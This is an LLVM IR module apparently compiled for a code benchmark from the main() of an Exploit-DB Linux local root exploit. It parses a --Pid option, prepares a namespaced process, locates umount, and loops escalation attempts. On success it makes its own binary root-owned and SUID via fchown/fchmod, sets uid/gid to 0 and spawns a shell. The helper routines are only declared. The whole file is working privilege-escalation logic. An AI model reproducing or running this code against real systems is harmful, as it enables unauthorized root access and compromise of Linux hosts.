; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43775.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43775.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i64, i64 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [46 x i8] c"%s: you are already root, invoking shell ...\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"%s: internal invocation, setting SUID mode\0A\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [41 x i8] c"%s: invoked as SUID, invoking shell ...\0A\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"%s requires parameter\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"--Pid\00", align 1
@namespacedProcessPid = common dso_local global i64 0, align 8
@errno = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [19 x i8] c"Invalid pid value\0A\00", align 1
@killNamespacedProcessFlag = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [21 x i8] c"Unknown argument %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [32 x i8] c"%s: setting up environment ...\0A\00", align 1
@osRelease = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [48 x i8] c"Failed to detect OS version, continuing anyway\0A\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"/bin\00", align 1
@umountPathname = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [5 x i8] c"PATH\00", align 1
@.str.12 = private unnamed_addr constant [52 x i8] c"Failed to locate \22umount\22 binary, is PATH correct?\0A\00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"%s: using umount at \22%s\22.\0A\00", align 1
@.str.14 = private unnamed_addr constant [43 x i8] c"Attempting to gain root, try %d of %d ...\0A\00", align 1
@.str.15 = private unnamed_addr constant [90 x i8] c"Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\0A\00", align 1
@.str.16 = private unnamed_addr constant [27 x i8] c"Executable now root-owned\0A\00", align 1
@.str.17 = private unnamed_addr constant [72 x i8] c"Escalation FAILED, maybe target system not (yet) supported by exploit!\0A\00", align 1
@SIGKILL = common dso_local global i32 0, align 4
@.str.18 = private unnamed_addr constant [70 x i8] c"No namespace cleanup for preexisting namespaces yet, do it manually.\0A\00", align 1
@.str.19 = private unnamed_addr constant [39 x i8] c"Cleanup completed, re-invoking binary\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.stat, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.stat, align 8
  %18 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  store i8* %21, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %22 = call i64 (...) @getuid()
  %23 = icmp eq i64 %22, 0
  br i1 %23, label %24, label %29

24:                                               ; preds = %2
  %25 = load i32, i32* @stderr, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %25, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0), i8* %26)
  %28 = call i32 @invokeShell(i8* null)
  store i32 1, i32* %3, align 4
  br label %203

29:                                               ; preds = %2
  %30 = call i64 (...) @geteuid()
  %31 = icmp eq i64 %30, 0
  br i1 %31, label %32, label %64

32:                                               ; preds = %29
  %33 = call i32 @stat(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), %struct.stat* %8)
  store i32 %33, i32* %9, align 4
  %34 = load i32, i32* %9, align 4
  %35 = icmp ne i32 %34, 0
  %36 = xor i1 %35, true
  %37 = zext i1 %36 to i32
  %38 = call i32 @assert(i32 %37)
  %39 = getelementptr inbounds %struct.stat, %struct.stat* %8, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %46, label %42

42:                                               ; preds = %32
  %43 = getelementptr inbounds %struct.stat, %struct.stat* %8, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %57

46:                                               ; preds = %42, %32
  %47 = load i32, i32* @stderr, align 4
  %48 = load i8*, i8** %6, align 8
  %49 = call i32 (i32, i8*, ...) @fprintf(i32 %47, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0), i8* %48)
  %50 = load i32, i32* @O_RDONLY, align 4
  %51 = call i32 @open(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i32 %50)
  store i32 %51, i32* %10, align 4
  %52 = load i32, i32* %10, align 4
  %53 = call i32 @fchown(i32 %52, i32 0, i32 0)
  %54 = load i32, i32* %10, align 4
  %55 = call i32 @fchmod(i32 %54, i32 2541)
  %56 = call i32 @exit(i32 0) #3
  unreachable

57:                                               ; preds = %42
  %58 = load i32, i32* @stderr, align 4
  %59 = load i8*, i8** %6, align 8
  %60 = call i32 (i32, i8*, ...) @fprintf(i32 %58, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0), i8* %59)
  %61 = call i32 @setresgid(i32 0, i32 0, i32 0)
  %62 = call i32 @setresuid(i32 0, i32 0, i32 0)
  %63 = call i32 @invokeShell(i8* null)
  store i32 1, i32* %3, align 4
  br label %203

64:                                               ; preds = %29
  store i32 1, i32* %11, align 4
  br label %65

65:                                               ; preds = %110, %64
  %66 = load i32, i32* %11, align 4
  %67 = load i32, i32* %4, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %111

69:                                               ; preds = %65
  %70 = load i8**, i8*** %5, align 8
  %71 = load i32, i32* %11, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %11, align 4
  %73 = sext i32 %71 to i64
  %74 = getelementptr inbounds i8*, i8** %70, i64 %73
  %75 = load i8*, i8** %74, align 8
  store i8* %75, i8** %12, align 8
  %76 = load i32, i32* %11, align 4
  %77 = load i32, i32* %4, align 4
  %78 = icmp eq i32 %76, %77
  br i1 %78, label %79, label %83

79:                                               ; preds = %69
  %80 = load i32, i32* @stderr, align 4
  %81 = load i8*, i8** %12, align 8
  %82 = call i32 (i32, i8*, ...) @fprintf(i32 %80, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0), i8* %81)
  store i32 1, i32* %3, align 4
  br label %203

83:                                               ; preds = %69
  %84 = load i8*, i8** %12, align 8
  %85 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i8* %84)
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %106, label %87

87:                                               ; preds = %83
  %88 = load i8**, i8*** %5, align 8
  %89 = load i32, i32* %11, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %11, align 4
  %91 = sext i32 %89 to i64
  %92 = getelementptr inbounds i8*, i8** %88, i64 %91
  %93 = load i8*, i8** %92, align 8
  %94 = call i64 @strtoll(i8* %93, i8** %13, i32 10)
  store i64 %94, i64* @namespacedProcessPid, align 8
  %95 = load i64, i64* @errno, align 8
  %96 = icmp ne i64 %95, 0
  br i1 %96, label %102, label %97

97:                                               ; preds = %87
  %98 = load i8*, i8** %13, align 8
  %99 = load i8, i8* %98, align 1
  %100 = sext i8 %99 to i32
  %101 = icmp ne i32 %100, 0
  br i1 %101, label %102, label %105

102:                                              ; preds = %97, %87
  %103 = load i32, i32* @stderr, align 4
  %104 = call i32 (i32, i8*, ...) @fprintf(i32 %103, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %203

105:                                              ; preds = %97
  store i64 0, i64* @killNamespacedProcessFlag, align 8
  br label %110

106:                                              ; preds = %83
  %107 = load i32, i32* @stderr, align 4
  %108 = load i8*, i8** %12, align 8
  %109 = call i32 (i32, i8*, ...) @fprintf(i32 %107, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0), i8* %108)
  store i32 1, i32* %3, align 4
  br label %203

110:                                              ; preds = %105
  br label %65

111:                                              ; preds = %65
  %112 = load i32, i32* @stderr, align 4
  %113 = load i8*, i8** %6, align 8
  %114 = call i32 (i32, i8*, ...) @fprintf(i32 %112, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.8, i64 0, i64 0), i8* %113)
  %115 = load i32, i32* @osRelease, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %124, label %117

117:                                              ; preds = %111
  %118 = call i64 (...) @detectOsRelease()
  %119 = icmp ne i64 %118, 0
  br i1 %119, label %120, label %123

120:                                              ; preds = %117
  %121 = load i32, i32* @stderr, align 4
  %122 = call i32 (i32, i8*, ...) @fprintf(i32 %121, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.9, i64 0, i64 0))
  br label %123

123:                                              ; preds = %120, %117
  br label %124

124:                                              ; preds = %123, %111
  %125 = call i8* @findUmountBinaryPathname(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  store i8* %125, i8** @umountPathname, align 8
  %126 = load i8*, i8** @umountPathname, align 8
  %127 = icmp ne i8* %126, null
  br i1 %127, label %134, label %128

128:                                              ; preds = %124
  %129 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %130 = icmp ne i8* %129, null
  br i1 %130, label %131, label %134

131:                                              ; preds = %128
  %132 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %133 = call i8* @findUmountBinaryPathname(i8* %132)
  store i8* %133, i8** @umountPathname, align 8
  br label %134

134:                                              ; preds = %131, %128, %124
  %135 = load i8*, i8** @umountPathname, align 8
  %136 = icmp ne i8* %135, null
  br i1 %136, label %140, label %137

137:                                              ; preds = %134
  %138 = load i32, i32* @stderr, align 4
  %139 = call i32 (i32, i8*, ...) @fprintf(i32 %138, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.12, i64 0, i64 0))
  br label %179

140:                                              ; preds = %134
  %141 = load i32, i32* @stderr, align 4
  %142 = load i8*, i8** %6, align 8
  %143 = load i8*, i8** @umountPathname, align 8
  %144 = call i32 (i32, i8*, ...) @fprintf(i32 %141, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0), i8* %142, i8* %143)
  %145 = call i64 (...) @prepareNamespacedProcess()
  store i64 %145, i64* %14, align 8
  %146 = load i64, i64* %14, align 8
  %147 = icmp slt i64 %146, 0
  br i1 %147, label %148, label %149

148:                                              ; preds = %140
  br label %179

149:                                              ; preds = %140
  store i32 10, i32* %15, align 4
  store i32 0, i32* %16, align 4
  br label %150

150:                                              ; preds = %175, %149
  %151 = load i32, i32* %16, align 4
  %152 = load i32, i32* %15, align 4
  %153 = icmp slt i32 %151, %152
  br i1 %153, label %154, label %176

154:                                              ; preds = %150
  %155 = load i32, i32* %16, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %16, align 4
  %157 = load i32, i32* @stderr, align 4
  %158 = load i32, i32* %16, align 4
  %159 = load i32, i32* %15, align 4
  %160 = call i32 (i32, i8*, ...) @fprintf(i32 %157, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.14, i64 0, i64 0), i32 %158, i32 %159)
  %161 = call i32 (...) @attemptEscalation()
  %162 = call i32 @stat(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), %struct.stat* %17)
  store i32 %162, i32* %18, align 4
  %163 = load i32, i32* %18, align 4
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %165, label %168

165:                                              ; preds = %154
  %166 = load i32, i32* @stderr, align 4
  %167 = call i32 (i32, i8*, ...) @fprintf(i32 %166, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.15, i64 0, i64 0))
  br label %176

168:                                              ; preds = %154
  %169 = getelementptr inbounds %struct.stat, %struct.stat* %17, i32 0, i32 0
  %170 = load i64, i64* %169, align 8
  %171 = icmp eq i64 %170, 0
  br i1 %171, label %172, label %175

172:                                              ; preds = %168
  %173 = load i32, i32* @stderr, align 4
  %174 = call i32 (i32, i8*, ...) @fprintf(i32 %173, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.16, i64 0, i64 0))
  br label %202

175:                                              ; preds = %168
  br label %150

176:                                              ; preds = %165, %150
  %177 = load i32, i32* @stderr, align 4
  %178 = call i32 (i32, i8*, ...) @fprintf(i32 %177, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.17, i64 0, i64 0))
  br label %179

179:                                              ; preds = %202, %176, %148, %137
  %180 = load i64, i64* @namespacedProcessPid, align 8
  %181 = icmp sgt i64 %180, 0
  br i1 %181, label %182, label %193

182:                                              ; preds = %179
  %183 = load i64, i64* @killNamespacedProcessFlag, align 8
  %184 = icmp ne i64 %183, 0
  br i1 %184, label %185, label %189

185:                                              ; preds = %182
  %186 = load i64, i64* @namespacedProcessPid, align 8
  %187 = load i32, i32* @SIGKILL, align 4
  %188 = call i32 @kill(i64 %186, i32 %187)
  br label %192

189:                                              ; preds = %182
  %190 = load i32, i32* @stderr, align 4
  %191 = call i32 (i32, i8*, ...) @fprintf(i32 %190, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.18, i64 0, i64 0))
  br label %192

192:                                              ; preds = %189, %185
  br label %193

193:                                              ; preds = %192, %179
  %194 = load i32, i32* %7, align 4
  %195 = icmp ne i32 %194, 0
  br i1 %195, label %200, label %196

196:                                              ; preds = %193
  %197 = load i32, i32* @stderr, align 4
  %198 = call i32 (i32, i8*, ...) @fprintf(i32 %197, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.19, i64 0, i64 0))
  %199 = call i32 @invokeShell(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %7, align 4
  br label %200

200:                                              ; preds = %196, %193
  %201 = load i32, i32* %7, align 4
  store i32 %201, i32* %3, align 4
  br label %203

202:                                              ; preds = %172
  store i32 0, i32* %7, align 4
  br label %179

203:                                              ; preds = %200, %106, %102, %79, %57, %24
  %204 = load i32, i32* %3, align 4
  ret i32 %204
}

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @invokeShell(i8*) #1

declare dso_local i64 @geteuid(...) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @assert(i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fchown(i32, i32, i32) #1

declare dso_local i32 @fchmod(i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @setresgid(i32, i32, i32) #1

declare dso_local i32 @setresuid(i32, i32, i32) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i64 @strtoll(i8*, i8**, i32) #1

declare dso_local i64 @detectOsRelease(...) #1

declare dso_local i8* @findUmountBinaryPathname(i8*) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i64 @prepareNamespacedProcess(...) #1

declare dso_local i32 @attemptEscalation(...) #1

declare dso_local i32 @kill(i64, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
